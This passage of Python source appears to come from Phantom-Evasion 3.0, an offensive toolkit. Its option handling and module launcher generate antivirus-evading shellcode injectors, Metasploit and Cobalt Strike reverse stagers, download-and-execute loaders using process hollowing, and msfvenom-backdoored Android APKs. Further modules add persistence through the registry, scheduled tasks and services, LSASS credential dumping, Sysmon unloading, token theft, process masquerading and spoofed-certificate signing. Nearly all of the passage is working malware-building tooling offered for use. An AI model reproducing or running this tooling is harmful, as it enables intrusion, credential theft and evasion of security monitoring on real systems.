        Cert=os.path.isfile("Setup/apk_sign/keystore.keystore")
        Info=os.path.isfile("Setup/apk_sign/keystore_info.txt")

        if (not(Cert and Info)):

            Random = YesOrNo(InputFunc("\n[>] generate cerificate with random value? (Y/n):"))
            KeytoolKeystore(Random)

    if "Persistence" in M_type:

        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to file to add to startup: ")
        ModOpt["Pname"]=InputFunc("\n[>] Insert name for the reg/task/service (default:random):") or RandString()

        if M_type == "Persistence_C_REG_windows" or M_type == "Persistence_CMD_REG_windows":

            ModOpt["Priv"] = InputFunc("\n[>] Require admin privilege? (y/n):")

        elif M_type == "Persistence_CMD_Schtasks_windows":

            ModOpt["SchtMode"]=InputFunc("\n[>] Insert task start condition (default:Startup): ") or "Startup"

            if ModOpt["SchtMode"] in ["Startup","S"]:

                ModOpt["Timevar"] = InputFunc("\n[>] Insert delay before exec at user login (default:0001:30): ") or "0001:30"

            elif ModOpt["SchtMode"] in ["Daily","D"]:

                ModOpt["Timevar"] = InputFunc("\n[>] Insert execution day time? (default:0030:00): ") or "0030:00"

            elif ModOpt["SchtMode"] in ["Idle","I"]:
                    
                ModOpt["Timevar"] = InputFunc("\n[>] Insert user idle time before exec?(default:0015:00):") or "0015:00" 

        elif M_type == "Persistence_C_KeepAliveProcess_windows":

            ModOpt["ProcTarget"]=InputFunc("\n[>] Insert name of the process to keep alive:")
            ModOpt["Timevar"] = InputFunc("\n[>] Insert time interval in millisecond between check (default:600000): ") or "600000"
                    
        elif M_type == "Persistence_CMD_CreateService_windows":

            pass


    elif M_type == "Privesc_C_DuplicateTokenEx_windows":

        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to file to start with cloned token: ")
        ModOpt["TargetPid"] = InputFunc("\n[>] Insert pid of the target process: ")

    elif M_type == "Postex_CMD_UnloadSysmonDriver_windows":

        pass

    elif M_type == "Postex_C_UnloadSysmonDriver_windows":

        pass

    elif M_type == "Postex_CMD_DumpLsass_windows":

        ModOpt["TargetPid"] = InputFunc("\n[>] Insert Lsass.exe pid: ")

    elif M_type == "Postex_C_SetFileAttributeHidden_windows":

        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to the file to hide: ")

    elif M_type == "Postex_CMD_AttribHideFile_windows":

        ModOpt["Binpath"]=InputFunc("\n[>] Insert fullpath to the file to hide: ")

    if "_C_" in M_type:

        ModOpt["JI"] = int(InputFunc("\n[>] Insert Junkcode Intesity value (default:10):") or "10")
        ModOpt["JF"] = int(InputFunc("\n[>] Insert Junkcode Frequency value  (default: 10):") or "10")
        ModOpt["JR"] = int(InputFunc("\n[>] Insert Junkcode Reinjection Frequency (default: 0):") or "0")

    if "_C_" in M_type and "windows" in M_type:

        ModOpt["EF"] = int(InputFunc("\n[>] Insert Evasioncode Frequency value  (default: 10):") or "10")
        ModOpt["DynImport"] = YesOrNo(InputFunc("\n[>] Dynamically load windows API? (Y/n):"))
        ModOpt["UnhookNtdll"]  = YesOrNo(InputFunc("\n[>] Add Ntdll api Unhooker? (Y/n):"))
        ModOpt["PEBmasquerade"]  = YesOrNo(InputFunc("\n[>] Masq peb process? (Y/n):"))
        ModOpt["AmsiBypass1"]  = False#YesOrNo(InputFunc("\n[>] Patch AmsiScanBuffer? (Y/n):"))
        ModOpt["DecoyProc"] = 0 #int(InputFunc("\n[>] Decoy processes number? (default:0):") or "0")

        if ModOpt["PEBmasquerade"] == True:

            ModOpt["Masqpath"] = InputFunc("\n[>] Insert fake process path?(default:C:\\windows\\system32\\notepad.exe):") or "C:\\\\windows\\\\system32\\\\notepad.exe"
            ModOpt["Masqcmdline"] = InputFunc("\n[>] Insert fake process commandline?(default:empty):") or ModOpt["Masqpath"]
  
    if "_C_" in M_type:

        ModOpt["Strip"] = YesOrNo(InputFunc("\n[>] Strip executable? (Y/n):"))

    if "_C_" in M_type and "windows" in M_type:

        ModOpt["Sign"] = YesOrNo(InputFunc("\n[>] Use certificate spoofer and sign executable? (Y/n):"))

        if ModOpt["Sign"] == True:

            ModOpt["SpoofCert"] = InputFunc("\n[>] Insert url target for certificate spoofer (default:www.windows.com:443):") or "www.windows.com:443"
            ModOpt["descr"] = InputFunc("\n[>] Insert certificate description (default:Notepad Benchmark Util):") or "Notepad Benchmark Util"

        ModOpt["Outformat"] = InputFunc("\n[>] Insert output format (default:exe):") or "exe"
  
        if ModOpt["Outformat"] == "dll":

            ModOpt["Reflective"] = True == YesOrNo(InputFunc("\n[>] Add Reflective loader? (Y/n):"))

    if "_C_" in M_type or "android" in M_type:

        ModOpt["Outfile"]=InputFunc("\n[>] Insert output filename:")

        if "windows" in M_type and (".exe" not in ModOpt["Outfile"] and ".dll" not in ModOpt["Outfile"]):

            ModOpt["Outfile"] += "." + ModOpt["Outformat"]

    return ModOpt


def ModuleLauncher(M_type,ModOpt={}):

    Interactive=False

    if len(ModOpt) == 0:
        Interactive=True
        ModOpt=ModuleOpt(M_type)
    else:
        ModOpt["verbose"] = False
        
    print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)

    if "ShellcodeInjection" in M_type:

        if ModOpt["Shelltype"] == "msfvenom" or ModOpt["Shelltype"] == "":

            ModOpt["Payload"] = PayloadGenerator(ModOpt["Payload"],ModOpt["Arch"],ModOpt["Host"],ModOpt["Port"],ModOpt["CustomOpt"],"c")

            ModOpt["Payload"] = ModOpt["Payload"].replace("unsigned char buf[] = ","").replace("\"","").replace("\n","").replace(";","")

        if "windows" in M_type:

            if ModOpt["ShellRes"] == True:

                ResGen(ModOpt)

    if "android" in M_type:

        unused_retval = PayloadGenerator(ModOpt["Payload"],"dalvik",ModOpt["Host"],ModOpt["Port"],ModOpt["CustomOpt"],"apk")

        ApktoolD("msf_gen.apk","msf_smali")

        if ModOpt["BackdoorApk"] != False and ModOpt["BackdoorApk"] != "":

            if ".apk" not in ModOpt["BackdoorApk"]:

                ModOpt["BackdoorApk"] += ".apk"

            ApktoolD(ModOpt["BackdoorApk"],"apk_smali")

        print(bcolors.GREEN + "\n[>] Obfuscating Smali code...\n" + bcolors.ENDC)

    PrintEncryption(M_type,ModOpt)

    LoadExecModule(M_type,ModOpt)

    if "_C_" in M_type:

        print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 

        AutoCompiler(M_type,ModOpt)

        StripBin(ModOpt)

    elif "android" in M_type:

        if ModOpt["BackdoorApk"] != False and ModOpt["BackdoorApk"] != "":

            ApktoolB("apk_smali")
            sleep(0.2)
            ApkSigner(ModOpt["Outfile"])
        else:
            ApktoolB("msf_smali")
            sleep(0.2)
            ApkSigner(ModOpt["Outfile"])

    sleep(0.3)
    Cleanup(ModOpt)

    if "windows" in M_type and "_C_" in M_type and ModOpt["Sign"] == True:

        ExeSigner(ModOpt["Outfile"],ModOpt["SpoofCert"],ModOpt["descr"])

    if "_C_" in M_type:

        print("\n[<>] File saved in Phantom-Evasion folder")

    if Interactive == True:

        Enter2Continue()

    elif ModOpt["verbose"] == True:

        print(ModOpt)

def CmdlineLauncher(inputarray):
    sleep(0.1)
    Banner()
    sleep(0.2)
    Advisor()
    parser = argparse.ArgumentParser(description='Phantom-Evasion 3.0')
    #parser.add_argument('integers', metavar='N', type=int, nargs='+',help='an integer for the accumulator')  
    parser.add_argument('-o','--output', help='Output Filename',required=False) 
    parser.add_argument('-v','--verbose', help='Print module data on exit', required=False)
    group0 = parser.add_mutually_exclusive_group()
    group0.add_argument('-s','--setup', help='Start phantom-evasion setup',action='store_true',required=False) 
    group0.add_argument('-m','--module', help='Select phantom-evasion module', required=False)
    group1 = parser.add_mutually_exclusive_group()
    group1.add_argument('-msfp','--msfvenom', help='Msfvenom payload to use in Shellcode_injection module', required=False)
    group1.add_argument('-cp','--custom', help='Custom payload to use in Shellcode_injection module', required=False)
    #parser.add_argument('-cf','--customfile', help='custom payload stored in .txt file to use in Shellcode_injection module', required=False)
    parser.add_argument('-H','--host', help='Lhost/Rhost for reverse/bind connection', required=False)
    parser.add_argument('-P','--port', help='Connection port', required=False)
    parser.add_argument('-U','--url', help='Download file from the specified url', required=False)
    parser.add_argument('-a','--arch', help='Target architecture', required=False)
    parser.add_argument('-e','--encrypt', help='Shellcode/file encryption mode', required=False)
    parser.add_argument('-ef','--encryptfile', help='Path to filename to encrypt and decrypt after download', required=False)
    parser.add_argument('-eo','--encryptoutput', help='Output filename of encrypted file ', required=False)
    parser.add_argument('-ds','--downloadsize', help='Download filesize in bytes (default:1000000)', required=False)
    parser.add_argument('-msfo','--msfoptions', help='Msfvenom options string', required=False)
    parser.add_argument('-i','--injectmode', help='Execution method', required=False)
    parser.add_argument('-tp','--targetprocess', help='Target process for code injection', required=False)
    parser.add_argument('-mem','--memtype', help='Heap/Virtual memory and R/W/X assignement policy', required=False)
    parser.add_argument('-f','--format', help='Output format (exe/dll)', required=False)
    parser.add_argument('-R','--reflective', help='Add reflective loader to dll outfile',action='store_true', required=False)
    parser.add_argument('-S','--strip', help='Strip executable',action='store_true', required=False)
    parser.add_argument('-res','--resource', help='Add shellcode as PE resource',action='store_true', required=False)   
    parser.add_argument('-c','--certsign', help='Certificate spoofer and exe signer', required=False)
    parser.add_argument('-cd','--certdescr', help='Certificate description', required=False)
    parser.add_argument('-E','--evasionfrequency', help='Windows evasion code frequency (default:10)', required=False)
    parser.add_argument('-J','--junkfrequency', help='Junkcode frequency (default:10)', required=False)
    parser.add_argument('-j','--junkintensity', help='Junkcode intensity (default:10)', required=False)
    parser.add_argument('-jr','--junkreinject', help='Junkcode reinjection intensity (default:10)', required=False)
    #parser.add_argument('-dp','--decoyproc', help='windows decoy processes number',required=False)
    parser.add_argument('-dl','--dynamicload', help='Dynamic loading of Windows API',action='store_true', required=False)
    parser.add_argument('-un','--unhook', help='Add Ntdll unhook routine', action='store_true',required=False)    
    parser.add_argument('-msq','--masqpath', help='Fake Process path for masquerading', required=False)
    parser.add_argument('-msqc','--masqcmd', help='Fake Fullcmdline for masquerading', required=False)
    parser.add_argument('-AB','--apkbackdoor', help='Apk file to backdoor', required=False)
    #parser.add_argument('-ps','--persistrun', help='Android Backdoored app start trigger backdoor',action='store_true',required=False)
    #parser.add_argument('-pr','--persistreboot', help='Android Backdoor start every reboot',action='store_true',required=False)       
    parser.add_argument('-bp','--binpath', help='File path for post/privesc/persistence module', required=False)
    parser.add_argument('-opt1','--option1', help='option1 for post/privesc/persistence module', required=False)
    parser.add_argument('-opt2','--option2', help='option2 for post/privesc/persistence module', required=False) 

    #parser.add_argument('-cp','--custom', help='custom payload to use in Shellcode_injection module', required=False)
    args = parser.parse_args()

    ModOpt={}

    if args.module in ["WSI","WRT","WRH","WRS","WDE","WDD","WPRG","WPKA","WPEU","WPEH","WPDT","WPDL","LSI","AOB"]:

        if args.output == None:
            print("[ERROR] required output filename (-o)\n")
            quit()

        ModOpt["Arch"] = args.arch or "x86"
        ModOpt["MemAlloc"] = args.memtype or "Heap_RWX"

        if "W" in args.module:

            ModOpt["Outformat"] = args.format or "exe"
            ModOpt["DecoyProc"] = 0
            ModOpt["EF"] = int(args.evasionfrequency or "10")

        ModOpt["Outfile"] = args.output
        ModOpt["Strip"] = args.strip == True
        ModOpt["JF"] = int(args.junkfrequency or "10")
        ModOpt["JI"] = int(args.junkintensity or "10")
        ModOpt["JR"] = int(args.junkreinject or "0")

        if args.module in ["LSI","WSI","AOB"]:

            if args.module == "WSI":

                M_type = "ShellcodeInjection_C_windows"
                ModOpt["ExecMethod"] = args.injectmode or "Thread"
                ModOpt["ShellRes"] = args.resource or False

                if ModOpt["ExecMethod"] in Remote_methods:

                    if ModOpt["Arch"] == "x86":

                        ModOpt["ProcTarget"] = args.targetprocess or "OneDrive.exe"
                    else:
                        ModOpt["ProcTarget"] = args.targetprocess or "SkypeApp.exe"

            elif args.module == "LSI":

                M_type = "ShellcodeInjection_C_linux"            
                ModOpt["ExecMethod"] = args.injectmode or "Thread"

            elif args.module == "AOB":

                M_type = "MsfvenomObfuscateBackdoor_android"            
                ModOpt["Shelltype"] = "msfvenom"
                ModOpt["Arch"] = "dalvik"               

            if args.msfvenom == None and args.custom == None:

                ModOpt["Shelltype"] = "msfvenom"

                if ModOpt["Arch"] == "x86":

                    if args.module == "WSI":

                        ModOpt["Payload"] = "windows/meterpreter/reverse_tcp"
                    else:
                        ModOpt["Payload"] = "linux/meterpreter/reverse_tcp"

                elif ModOpt["Arch"] == "x64":

                    if args.module == "WSI":

                        ModOpt["Payload"] = "windows/x64/meterpreter/reverse_tcp"                       
                    else:
                        ModOpt["Payload"] = "linux/x64/meterpreter/reverse_tcp"
                else:
                    ModOpt["Payload"] = "android/meterpreter/reverse_tcp"

            elif args.msfvenom != None:

                ModOpt["Shelltype"] = "msfvenom"
                ModOpt["Payload"] = args.msfvenom
            else:
                ModOpt["Shelltype"] = "custom"
                ModOpt["Payload"] = args.custom

            if args.host == None or args.port == None:
                print("[ERROR] Msfvenom shellcode options require Host (-H) and Port (-P) arguments\n")

            if "reverse" in args.msfvenom:

                ModOpt["Host"] = "LHOST=" + args.host
                ModOpt["Port"] = "LPORT=" + args.port
            else:
                ModOpt["Host"] = "RHOST=" + args.host
                ModOpt["Port"] = "RPORT=" + args.port

            ModOpt["CustomOpt"] = args.msfoptions or ""

            if args.module == "AOB":
 
                ModOpt["BackdoorApk"] = args.apkbackdoor or False

                if ModOpt["BackdoorApk"] != False:

                    ModOpt["RunOnAppStart"] = True #args.persistrun or False
                    #ModOpt["RebootPersistence"] = args.persistreboot or False

            if args.encrypt != None and args.module != "AOB":

                ModOpt["Encode"] = args.encrypt
            else:
                ModOpt["Encode"] = "1"

        elif args.module in ["WRT","WRH","WRS"]:

            if args.module == "WRT":

                M_type = "ReverseTcpStager_C_windows"

            elif args.module == "WRH":

                M_type = "ReverseHttpStager_C_windows"

            elif args.module == "WRS":

                M_type = "ReverseHttpsStager_C_windows"

            ModOpt["ExecMethod"] = args.injectmode or "Thread"

            if ModOpt["ExecMethod"] in Remote_methods:

                if ModOpt["Arch"] == "x86":

                    ModOpt["ProcTarget"] = args.targetprocess or "OneDrive.exe"
                else:
                    ModOpt["ProcTarget"] = args.targetprocess or "explorer.exe"

            if args.host == None or args.port == None:
                print("[ERROR] Reverse stager require Host (-H) and Port (-P) arguments\n")
                quit()

            ModOpt["Lhost"] = args.host
            ModOpt["Lport"] = args.port

        elif args.module in ["WDE","WDD"]:

            if args.url == None:

                print("[ERROR] downloadexec require url argument (-U)\n")
                quit()

            ModOpt["UrlTarget"] = args.url
            ModOpt["Filesize"] = args.downloadsize or "1000000"

            if args.module == "WDE":
                M_type = "DownloadExecExe_C_windows"
                ModOpt["ExecMethod"] = args.injectmode or "ProcessHollowing"
                ModOpt["ProcTarget"] = args.targetprocess or "svchost.exe"

            elif args.module == "WDD":
                M_type = "DownloadExecDll_C_windows"
                ModOpt["ExecMethod"] = args.injectmode or "ReflectiveDll"

                if ModOpt["Arch"] == "x86":

                    ModOpt["ProcTarget"] = args.targetprocess or "OneDrive.exe"
                else:
                    ModOpt["ProcTarget"] = args.targetprocess or "explorer.exe"

            if args.encryptfile != None:

                ModOpt["cryptFile"] = args.encryptfile
                ModOpt["Encode"] = args.encrypt or "1"

            else:
                ModOpt["cryptFile"] = False
                ModOpt["Encode"] = "1"

        elif args.module in ["WPRG","WPKA","WPEU","WPEH","WPDT","WPDL"]:

            if args.module == "WPRG":
                M_type = "Persistence_C_Reg_windows"
                ModOpt["Binpath"] = args.binpath   
                ModOpt["PName"] = args.option1 or RandString()
                ModOpt["Priv"] = args.option2 or False

            elif args.module == "WPKA":
                M_type = "Persistence_C_KeepAliveProcess_windows"
                ModOpt["Binpath"] = args.binpath   
                ModOpt["Timevar"] = args.option1 or "6000"
            
            elif args.module == "WPEU":
                M_type = "Postex_C_UnloadSysmonDriver_windows"

            elif args.module == "WPEH":
                M_type = "Postex_C_SetFileAttributeHide_windows"
                ModOpt["Binpath"] = args.binpath

            elif args.module == "WPDT":
                M_type = "Privesc_C_DuplicateToken_windows"
                ModOpt["Binpath"] = args.binpath
                ModOpt["TargetPid"] = args.option1

            elif args.module == "WPDT":
                M_type = "Postex_C_MiniDumpWriteDumpLsass_windows"
        
        if args.module != "AOB" and args.module != "LSI":

            ModOpt["UnhookNtdll"] = args.unhook or False
            
            if args.masqpath != None:
                ModOpt["PEBmasquerade"] = True
                ModOpt["Masqpath"] = args.masqpath
                ModOpt["Masqcmdline"] = args.masqcmd or ModOpt["Masqpath"]
            else:
                ModOpt["PEBmasquerade"] = False
  
            if args.dynamicload == True:

                ModOpt["DynImport"] = True
            else:
                ModOpt["DynImport"] = False

            if args.certsign != None:

                ModOpt["Sign"] = True
                ModOpt["SpoofCert"] = args.certsign or "www.windows.com:443"
                ModOpt["descr"] = args.certdescr or "Notepad Benchmark Util"
            else:
                ModOpt["Sign"] = False

            if args.reflective == True and ModOpt["Outformat"] == "dll":

                ModOpt["Reflective"] = True
            else:
                ModOpt["Reflective"] = False

    elif args.module in ["WPRGc","WPSTc","WPSCc","WPEUc","WPEHc","WPDLc"]:

            if args.module == "WPRGc":
                M_type = "Persistence_CMD_Reg_windows"
                ModOpt["Binpath"] = args.binpath   
                ModOpt["Pname"] = args.option1 or RandString()
                ModOpt["Priv"] = args.option2 or False

            elif args.module == "WPSTc":
                M_type = "Persistence_CMD_Schtasks_windows"
                ModOpt["Binpath"] = args.binpath
                ModOpt["SchtMode"]= args.option1
                ModOpt["Timevar"] = args.option2 or "0001:00"


            elif args.module == "WPSCc":
                M_type = "Persistence_CMD_CreateService_windows"
                ModOpt["Binpath"] = args.binpath
                ModOpt["Pname"]= args.option1 or RandString()
            
            elif args.module == "WPEUc":
                M_type = "Postex_CMD_UnloadSysmonDriver_windows"

            elif args.module == "WPEHc":
                M_type = "Postex_CMD_AttribHideFile_windows"
                ModOpt["Binpath"] = args.binpath

            elif args.module == "WPDLc":
                M_type = "Postex_CMD_comsvcsdllDumpLsass_windows"

    elif args.setup == True: 

        AutoSetup()

    else:

        quit()

    if args.verbose == True:
        
        ModOpt["verbose"] = True

    if args.setup == True:

        quit()
    else:
        ModuleLauncher(M_type,ModOpt)


def SelectEncryption(data):

    print(bcolors.OCRA + "\n[>] " + data + " encryption\n" + bcolors.ENDC)
    sleep(0.2)
    print("[1] none                \n")
    print("[2] Xor                 \n")
    print("[3] Double-key Xor      \n")
    print("[4] Vigenere            \n")
    print("[5] Double-key Vigenere \n")

    enc_type = InputFunc("\n[>] Select encoding option: ")

    return enc_type

def PrintEncryption(M_type,ModOpt):

    if (("ShellcodeInjection" in M_type or "DownloadExec" in M_type) and "Encode" in ModOpt):

        if ModOpt["Encode"] == "2":

            print(bcolors.GREEN + "[>] Xor encryption...\n" + bcolors.ENDC)

        elif ModOpt["Encode"] == "3":

            print(bcolors.GREEN + "[>] Double-key Xor encryption...\n" + bcolors.ENDC)

        elif ModOpt["Encode"] == "4":

            print(bcolors.GREEN + "[>] Vigenere encryption...\n" + bcolors.ENDC)

        elif ModOpt["Encode"] == "5":

            print(bcolors.GREEN + "[>] Double-key Vigenere encryption...\n" + bcolors.ENDC)

def Cleanup(ModOpt):

    CleanupList = ["Source.c","Source.o","ReflectiveLoader.h","ReflectiveLoader.c","ReflectiveLoader.o","msf_gen.apk","msf_rebuild.apk"]

    if "ShellRes" in ModOpt and ModOpt["ShellRes"]:

        CleanupList.append(ModOpt["Rcfile"])
        CleanupList.append(ModOpt["Resfile"])
        CleanupList.append(ModOpt["Binfile"])        

    for x in CleanupList:
    
        try:
            os.remove(x)
        except:
            pass
    
    try:
        rmtree("apk_smali")
        rmtree("msf_smali")
    except:
        pass

def RequireMultiproc():

    ans=YesOrNo(InputFunc("\n[>] Add multiple processes behaviour?(y/n): "))

    if ans == True:

        Procnumb=InputFunc("\n[>] Insert number of decoy processes (integer between 1-3): ")

        if (Procnumb == "1") or (Procnumb == "2") or (Procnumb == "3"):
            
            return Procnumb
    else:
        return "0"


def ApktoolD(baksmali,name):

    print(bcolors.GREEN + "\n[>] Baksmaling...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','d',baksmali,'-o',name],shell=True)
    else:
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','d',baksmali,'-o',name])  
      
def ApktoolB(smali):

    print(bcolors.GREEN + "\n[>] Smaling...\n" + bcolors.ENDC)

    if platform.system() == "Windows":
        
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','b',smali,'-o','msf_rebuild.apk'],shell=True)
    else:
        subprocess.call(['java','-jar','Setup/apk_sign/apktool_2.4.1.jar','b',smali,'-o','msf_rebuild.apk'])

        
def ApkSigner(Apk_out):

    if ".apk" not in Apk_out:

        Apk_out+=".apk"
        
    print(bcolors.GREEN + "\n[>] Aligning with Zipalign..." + bcolors.ENDC)

    subprocess.call(['zipalign','4','msf_rebuild.apk',Apk_out])
    #os.rename('msf_rebuild.apk',Apk_out)

    print(bcolors.GREEN + "\n[>] Resigning apk...\n" + bcolors.ENDC)
    Info=open("Setup/apk_sign/keystore_info.txt","r")

    for line in Info:

        if "Alias:" in line:
            Alias=line.split()[1]

        elif "KeystorePassword:" in line:
            KeystorePassword=line.split()[1]

    os.system("apksigner sign --ks Setup/apk_sign/keystore.keystore --ks-key-alias " + Alias + " --ks-pass pass:" + KeystorePassword + " --key-pass pass:" + KeystorePassword + " " + Apk_out)


def KeytoolKeystore(Random):

    if Random:
        
        Alias = RandString()
        Passw = RandString()
        Link = RandString() + ".com"
        OU = RandString()
        O = RandString()
        Loc = RandString()
        S = RandString()
        Country = RandString()        

    else:
  
        Alias = InputFunc("\n[>] Insert Keystore Alias: ")
        Passw = InputFunc("\n[>] Insert Keystore Password: ")
        Link = InputFunc("\n[>] Organization link: ")
        OU = InputFunc("\n[>] Organization unit: ")
        O = InputFunc("\n[>] Organization name: ")
        Loc = InputFunc("\n[>] Locality: ")
        S = InputFunc("\n[>] State: ")
        Country = InputFunc("\n[>] Country: ")
    
    os.system("keytool -genkey -noprompt -alias " + Alias + " -dname \"CN=" + Link + ", OU=" + OU + " , O= " + O + ", L=" + Loc + ", S=" + S + ", C=" + Country + "\" -keystore Setup/apk_sign/keystore.keystore -keyalg RSA -keysize 2048 -validity 10000 -storepass " + Passw + " -keypass "  + Passw)

    Data2Store=""
    Data2Store+="Alias: " + Alias + "\n"
    Data2Store+="KeystorePassword: " + Passw + "\n"

    with open("Setup/apk_sign/keystore_info.txt","w") as InfoKeystore:

        InfoKeystore.write(Data2Store)
        InfoKeystore.close() 

def YesOrNo(Answerme):
    if (Answerme == "y") or (Answerme == "Y") or (Answerme == "yes") or (Answerme == "Yes") or (Answerme == ""):
        return True
    else:
        return False 

def ModuleDescription(M_type):
    print("\n[+] MODULE DESCRIPTION:\n") 
    description = "" 

    if M_type == "ShellcodeInjection_C_windows":

        description += "  Inject and execute shellcode \n"
        description += "  [>] Local process shellcode execution type:\n"
        description += "   > Thread                            \n"
        description += "   > APC                               \n\n"
        description += "  [>] Remote process shellcode execution type:\n"
        description += "   > ThreadExecutionHijack       (TEH) \n"
        description += "   > Processinject               (PI)  \n"
        description += "   > APCSpray                    (APCS)\n"
        description += "   > EarlyBird                   (EB) \n"
        description += "   > EntryPointHijack            (EPH)\n\n"  
        description += "  [>] Local Memory allocation type:\n"
        description += "   > Virtual_RWX                     \n"
        description += "   > Virtual_RW/RX                   \n"
        description += "   > Virtual_RW/RWX                  \n"
        description += "   > Heap_RWX                        \n\n"
        description += "  [>] Remote Memory allocation type:\n"
        description += "   > Virtual_RWX                     \n"
        description += "   > Virtual_RW/RX                   \n"
        description += "   > Virtual_RW/RWX                  \n"
        description += "   > SharedSection                   \n\n"        
        description += "  [>] Shellcode Encryption supported \n"
        description += "  [>] Shellcode can be embedded as resource\n"
        description += "  [>] AUTOCOMPILE format: exe,dll \n\n"

    elif M_type == "ShellcodeInjection_C_linux":

        description += "  Inject and execute shellcode \n"
        description += "  [>] Local process shellcode execution type:\n"
        description += "   > Thread                          \n\n"
        description += "  [>] Local Memory allocation type:\n"
        description += "   > Heap_RWX                        \n\n"      
        description += "  [>] Shellcode Encryption supported \n"
        description += "  [>] Shellcode can be embedded as resource \n"
        description += "  [>] AUTOCOMPILE format: bin \n\n"

    elif M_type == "ReverseTcpStager_C_windows" or M_type == "ReverseHttpStager_C_windows" or M_type == "ReverseHttpsStager_C_windows":

        if M_type == "ReverseTcpStager_C_windows":

            conn="tcp"

        elif M_type == "ReverseHttpStager_C_windows":

            conn = "http"

        else:
            conn = "https"

        description += "  Pure C reverse " + conn + "stager \n"
        description += "  compatible with metasploit and cobaltstrike beacon\n"
        description += "  [>] Local process stage execution type:\n"
        description += "   > Thread                          \n"
        description += "   > APC                             \n\n"
        description += "  [>] Local Memory allocation type:\n\n"
        description += "   > Virtual_RWX                     \n"
        description += "   > Virtual_RW/RX                   \n"
        description += "   > Virtual_RW/RWX                  \n"
        description += "   > Heap_RWX                        \n\n"     
        description += "  [>] AUTOCOMPILE format: exe,dll \n\n"

    elif M_type == "DownloadExecExe_C_windows" or M_type == "DownloadExecDll_C_windows":

        if M_type == "DownloadExecExe_C_windows":

            Oformat = "exe"
        else:
            Oformat = "dll"
    
        description += "  Download and execute " + Oformat + " without writing on disk \n"
        description += "  [>] Remote process execution type:\n"

        if Oformat == "exe":
            description += "   > ProcessHollowing       (PH) \n\n"
        else:
            description += "   > ReflectiveDll          (RD) \n"
            description += "   > RDAPC                       \n"
            description += "   > ManualMap              (MM) \n\n"      
        description += "  [>] File encryption supported \n"
        description += "  [>] AUTOCOMPILE format: exe,dll \n\n"

    elif M_type == "MsfvenomObfuscateBackdoor_android":

        description += "  Msfvenom android payload obfuscator\n"
        description += "  smali/baksmali msfvenom payloads with apktool\n"
        description += "  [>] Obfuscated payload can be used to backdoor apk file\n"
        description += "  [>] Outformat: apk\n\n"

    elif M_type == "Privesc_C_DuplicateTokenEx_windows":

        description += "  Start process with cloned token \n"
        description += "  Require pid of the target process for token duplication\n"
        description += "  [>] Outformat: exe,dll\n\n"

    elif M_type == "Postex_CMD_comsvcsdllDumpLsass_windows":

        description += "  Dump Lsass \n"
        description += "  Require admin privilege\n"
        description += "  [>] Outformat: cmdline\n\n"

    elif M_type == "Postex_C_DumpLsass_windows":

        description += "  Dump Lsass using MiniDumpWriteDump API\n"
        description += "  Require admin privilege\n"
        description += "  [>] Outformat: exe,dll\n\n"   

    elif M_type == "Postex_C_UnloadSysmonDriver_windows":

        description += "  Unload Sysmon driver using FilterUnload API\n"
        description += "  Require admin privilege\n"
        description += "  [>] Outformat: exe,dll\n\n"

    elif M_type == "Postex_CMD_UnloadSysmonDriver_windows":

        description += "  Unload Sysmon driver\n"
        description += "  Require admin privilege\n"
        description += "  [>] Outformat: cmdline\n\n"

    elif M_type == "Postex_CMD_AttribHideFile_windows":

        description += "  Hide file using attrib\n"
        description += "  [>] Outformat: cmdline\n\n"

    elif M_type == "Postex_C_SetFileAttributeHidden_windows":

        description += "  Hide file using SetFileAttribute API\n"
        description += "  [>] Outformat: exe,dll\n\n"

    elif M_type == "Persistence_C_Reg_windows":

        description += "Persistence (new registry key)\n"
        description += "  [>] Outformat: exe,dll\n\n"

    elif M_type == "Persistence_CMD_Reg_windows":

        description += "Persistence using reg.exe\n"
        description += "  [>] Outformat: cmdline\n\n"

    elif M_type == "Persistence_CMD_Schtasks_windows":

        description += "Task schedule using schtasks.exe\n"
        description += "  [>] Outformat: cmdline\n\n"

    elif M_type == "Persistence_CMD_CreateService_windows":  

        description += "Create new service using sc.exe\n"
        description += "  [>] Outformat: cmdline\n\n"

    else: 
        description = "None"

    print(description)
    try:   
        ans=input("  Press Enter to continue: ") 
    except SyntaxError:
        pass

    pass
